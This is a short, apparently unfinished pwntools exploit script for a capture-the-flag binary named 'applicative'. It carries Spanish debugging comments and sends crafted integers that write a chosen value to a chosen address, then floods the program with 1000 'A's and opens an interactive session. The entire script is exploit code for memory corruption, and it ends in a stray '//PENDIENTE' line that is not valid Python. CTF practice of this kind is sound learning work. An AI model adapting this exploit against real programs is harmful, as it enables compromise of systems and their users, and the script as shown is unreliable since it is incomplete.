#!/usr/bin/python3
from pwn import *
context.log_level='debug'

elf = context.binary = ELF("applicative")

#
#b4 es oara el cmp rax con 1337
#8c es donde truena por: mov    dword ptr [rcx], eax
## break *0x4027B4 jne

# break *0x40398c
# break *0x4027B4
gs = '''
break *0x40398c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def input(s):
	io.sendline(s)

io=start()

for i in range(241,246):
	input(str(i))


input(str(0x60b138))#esto es donde => rcx
input(str(0x4025F0))#esto es lo que escribo => eax
input("A"*1000)
io.interactive()
//PENDIENTE
# =============================================================================

